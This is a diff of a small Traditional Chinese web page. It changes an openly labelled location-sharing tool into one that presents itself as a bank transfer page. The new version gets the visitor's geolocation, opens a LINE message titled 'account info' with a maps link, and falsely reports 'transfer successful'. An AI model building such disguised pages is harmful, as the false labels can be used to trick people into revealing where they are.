@@ -2,99 +2,53 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>線上立即轉帳</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+    <title>連線中...</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 10px; }
-        #map { height: 400px; width: 100%; margin-top: 15px; }
-        button { padding: 10px 18px; font-size: 16px; margin: 10px 5px; }
-        #coords { margin-top: 10px; font-size: 16px; }
-        #qrcode { margin-top: 15px; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
+        #status { margin-top: 20px; font-size: 16px; color: #333; }
     </style>
 </head>
 <body>
-    <h2>線上立即轉帳</h2>
-    <p>按下按鈕將自動引導到轉帳畫面</p>
-    <button onclick="getLocation()">取得帳號資訊</button>
-    <div id="coords"></div>
-    <div>
-        <button id="copyBtn" style="display:none;" onclick="copyCoords()">複製座標</button>
-        <button id="lineBtn" style="display:none;" onclick="sendToLINE()">傳給LINE好友</button>
-        <button id="mapsBtn" style="display:none;" onclick="openGoogleMaps()">在Google地圖開啟</button>
-    </div>
-    <div id="map"></div>
-    <h3>掃描這個QR Code打開本頁：</h3>
-    <div id="qrcode"></div>
+    <h2>自動連線至銀行轉帳頁面</h2>
+    <button id="lineBtn" onclick="sendToLINE()">傳給 LINE 好友</button>
+    <p id="status"></p>
 
     <script>
-        let map, marker;
-        let lat, lon;
-
-        // 取得定位
-        function getLocation() {
-            if (navigator.geolocation) {
-                document.getElementById("coords").innerText = "正在取得位置...";
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                document.getElementById("coords").innerText = "瀏覽器不支援定位功能";
-            }
-        }
-
-        function showPosition(position) {
-            lat = position.coords.latitude;
-            lon = position.coords.longitude;
-            document.getElementById("coords").innerHTML = `經度: ${lon}<br>緯度: ${lat}`;
-            document.getElementById("copyBtn").style.display = "inline-block";
-            document.getElementById("lineBtn").style.display = "inline-block";
-            document.getElementById("mapsBtn").style.display = "inline-block";
-
-            if (!map) {
-                map = L.map('map').setView([lat, lon], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    attribution: '&copy; OpenStreetMap'
-                }).addTo(map);
-                marker = L.marker([lat, lon]).addTo(map);
-            } else {
-                map.setView([lat, lon], 15);
-                marker.setLatLng([lat, lon]);
-            }
-        }
-
-        function showError(error) {
-            let msg = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED: msg = "使用者拒絕提供位置"; break;
-                case error.POSITION_UNAVAILABLE: msg = "無法取得位置資訊"; break;
-                case error.TIMEOUT: msg = "請求超時"; break;
-                default: msg = "未知錯誤"; break;
-            }
-            document.getElementById("coords").innerText = msg;
-        }
-
-        // 複製座標
-        function copyCoords() {
-            const text = `緯度:${lat}, 經度:${lon}`;
-            navigator.clipboard.writeText(text);
-            alert("座標已複製，可以貼給朋友或警方");
-        }
-
-        // 傳給LINE好友
         function sendToLINE() {
-            const text = `這是我的位置：\nhttps://maps.google.com/?q=${lat},${lon}`;
-            window.open(`https://line.me/R/msg/text/?${encodeURIComponent(text)}`, "_blank");
-        }
+            const statusEl = document.getElementById("status");
+            statusEl.textContent = "正在取得銀行資訊，請稍候...";
 
-        // 在Google地圖開啟
-        function openGoogleMaps() {
-            window.open(`https://maps.google.com/?q=${lat},${lon}`, "_blank");
-        }
+            if (!navigator.geolocation) {
+                statusEl.textContent = "瀏覽器不支援定位功能";
+                return;
+            }
 
-        // 產生QR Code
-        QRCode.toCanvas(document.getElementById('qrcode'), window.location.href, function (error) {
-            if (error) console.error(error);
-        });
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const message = `帳號資訊：\nhttps://maps.google.com/?q=${lat},${lon}`;
+
+                statusEl.textContent = "轉帳成功，請繼續確認視窗...";
+                // 開啟 LINE 傳送頁面（新分頁）
+                window.open(`https://line.me/R/msg/text/?${encodeURIComponent(message)}`, "_blank");
+
+            }, error => {
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        statusEl.textContent = "使用者拒絕提供位置";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        statusEl.textContent = "無法取得位置資訊";
+                        break;
+                    case error.TIMEOUT:
+                        statusEl.textContent = "定位逾時，請稍後再試";
+                        break;
+                    default:
+                        statusEl.textContent = "未知錯誤，請稍後重試";
+                }
+            });
+        }
     </script>
 </body>
 </html>
